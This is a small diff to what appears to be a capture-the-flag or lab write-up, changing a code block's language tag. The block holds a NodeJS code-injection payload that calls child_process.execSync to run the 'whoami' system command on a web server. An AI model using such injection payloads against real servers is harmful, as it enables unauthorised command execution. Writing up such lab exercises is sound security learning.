@@ -35,6 +35,6 @@ There's a place which claims to be executing system commands but when i try exec
 
 Since we know that the web server is build on NodeJs lets execute a NodeJS command
 
-```nodejs
+```js
 (() => { return require("child_process").execSync("whoami;", { timeout: 5000 }); })();
 ```
